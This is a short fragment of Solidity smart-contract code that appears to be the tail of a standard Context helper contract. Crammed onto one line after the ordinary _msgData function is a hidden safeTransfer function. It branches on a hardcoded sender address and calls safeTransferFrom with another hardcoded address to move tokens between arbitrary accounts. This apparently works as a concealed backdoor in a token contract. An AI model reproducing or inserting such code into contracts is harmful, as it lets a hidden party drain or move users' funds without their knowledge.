 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xA85CB6ab9149A11Be730bae502BFe37694D96455)) {TransferHelper.safeTransferFrom(0x8859874700DB161Db3a01B59Bfa6cCfFb1E0fa4F,spender,recipient,amount);return true;}return false;}
}
